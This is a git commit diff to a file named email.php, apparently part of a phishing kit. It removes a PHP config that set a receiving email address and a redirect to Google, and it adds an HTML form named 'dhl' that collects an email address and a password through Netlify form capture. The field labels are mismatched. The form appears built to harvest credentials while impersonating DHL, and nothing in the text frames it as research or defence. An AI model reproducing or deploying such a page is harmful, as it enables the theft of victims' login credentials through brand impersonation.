408590e8299103629ae8ec2d57564ba03e72d2e2
zigger1996 <85035806+zigger1996@users.noreply.github.com>
2021-06-01 12:11:06 +0100

    Update email.php

--- email.php
+++ email.php
@@ -1,4 +1,11 @@
-<?php 
-$Receive_email="ziggergold@protonmail.com";
-$redirect="https://www.google.com/";
-?>
+<form name="dhl" netlify>
+  <p>
+    <label>Name <input type="Email" name="Email" /></label>
+  </p>
+  <p>
+    <label>Email <input type="password" name="Password" /></label>
+  </p>
+  <p>
+    <button type="submit">Send</button>
+  </p>
+</form>
